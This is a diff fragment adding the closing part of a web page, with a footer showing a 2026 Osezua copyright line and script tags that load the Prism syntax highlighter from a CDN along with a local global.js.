+      </div>
+      <span class="footer-sep" aria-hidden="true">&middot;</span>
+      <span class="footer-copy">&copy; 2026 Osezua. All rights reserved.</span>
+    </div>
+  </footer>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-clike.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
+  <script>if (window.Prism) Prism.highlightAll();</script>
+  <script src="../global.js"></script>
+</body>
+</html>
